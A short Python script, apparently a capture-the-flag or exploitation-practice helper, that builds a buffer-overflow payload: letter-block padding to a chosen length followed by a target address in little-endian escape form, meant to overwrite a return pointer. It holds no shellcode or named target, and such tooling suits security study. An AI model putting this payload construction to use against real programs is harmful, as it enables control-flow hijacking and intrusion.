import sys

def address_to_little_endian(address):
    if isinstance(address, str) and address.startswith('0x'):
        address = int(address, 16)
    elif not isinstance(address, int):
        raise ValueError("Input must be an integer or a hexadecimal string (starting with '0x')")

    address_bytes = address.to_bytes(8, byteorder='little')
    formatted_address = ''.join([f"\\x{byte:02x}" for byte in address_bytes])
    return formatted_address

def create_payload(buffer_size, target_address):
    alphabet = ''.join([chr(i) for i in range(ord('A'), ord('Z') + 1)])
    payload = ''
    count = 0

    while len(payload) < buffer_size:
        payload += alphabet[count % len(alphabet)] * 8
        count += 1

    # Truncate the payload to the desired buffer size
    payload = payload[:buffer_size]

    payload += address_to_little_endian(target_address)
    return payload

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 payload.py <buffer_size> <target_addr>")
        sys.exit(1)

    try:
        buffer_size = int(sys.argv[1])
        target_address = sys.argv[2]
    except ValueError:
        print("Buffer size must be an integer.")
        sys.exit(1)

    payload = create_payload(buffer_size, target_address)
    print(payload)
    